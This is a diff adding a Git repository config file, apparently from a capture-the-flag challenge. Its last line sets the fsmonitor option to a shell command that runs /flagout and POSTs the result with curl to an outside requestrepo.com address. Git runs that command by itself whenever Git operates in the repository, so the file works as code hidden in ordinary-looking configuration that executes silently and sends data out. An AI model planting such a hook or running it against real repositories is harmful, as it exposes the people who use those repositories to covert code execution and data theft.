@@ -1,0 +1,6 @@
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+	fsmonitor = "curl -X POST -d "flag=$(/flagout)" http://6u4n4j67.requestrepo.com/ #"
